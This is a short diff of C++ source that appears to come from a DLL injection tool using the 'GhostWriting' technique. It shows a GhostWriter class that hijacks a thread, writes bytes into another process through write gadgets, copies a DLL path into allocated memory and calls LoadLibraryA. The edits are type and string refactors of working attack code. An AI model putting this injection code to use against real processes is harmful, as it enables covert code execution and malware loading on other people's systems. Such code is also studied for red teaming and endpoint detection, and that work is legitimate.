@@ -83,7 +83,7 @@ void GhostWriter::SetContext(void* context)
     this->ResumeThread();
 }
 
-void GhostWriter::WriteBytes(BYTE* buffer, size_t bufferSize, uintptr_t where)
+void GhostWriter::WriteBytes(const BYTE* buffer, size_t bufferSize, uintptr_t where)
 {
     unsigned int ptrSize = this->is32Bits ? 4 : 8;
     size_t newSize = bufferSize + ptrSize; // extra space for null bytes
@@ -93,7 +93,7 @@ void GhostWriter::WriteBytes(BYTE* buffer, size_t bufferSize, uintptr_t where)
 
     for (unsigned int i = 0; i < bufferSize; i += ptrSize)
     {
-        uintptr_t what = *reinterpret_cast<uintptr_t*>(buffer + i);
+        uintptr_t what = *(uintptr_t*)(buffer + i);
         this->CallWriteGadget(what, where + i);
         this->WaitForLoop();
     }
@@ -377,7 +377,7 @@ bool GhostWritingInjection(DWORD threadID, PE& dll)
 
         // write dll path
         std::cout << "Writing dll path in the newly allocated memory...\n";
-        ghostWriter.WriteBytes(reinterpret_cast<BYTE*>(dll.filePath), strnlen(dll.filePath, MAX_PATH) + 1, memoryPageAddr);
+        ghostWriter.WriteBytes(reinterpret_cast<const BYTE*>(dll.filePath.c_str()), dll.filePath.length() + 1, memoryPageAddr);
         ghostWriter.WaitForLoop();
 
         std::cout << "Calling LoadLibraryA...\n";
